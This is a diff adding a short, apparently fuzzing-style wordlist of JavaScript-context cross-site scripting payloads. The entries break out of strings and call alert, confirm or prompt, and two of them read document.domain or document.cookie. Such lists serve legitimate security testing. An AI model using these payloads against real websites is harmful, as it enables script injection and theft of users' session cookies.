@@ -1,0 +1,15 @@
+\"-alert(1)}//
+\"-confirm(1)}//
+\"-prompt(1)}//
+\";alert(1);//
+\";confirm(1);//
+\";prompt(1);//
+\"));alert(1);//
+\"));confirm(1);//
+\"));prompt(1);//
+\"}catch(e){};alert(1);//
+\"}else{alert(1)}//
+\"-alert(document.domain)}//
+\"-alert(document.cookie)}//
+\'-alert(1)//
+\');alert(1);//
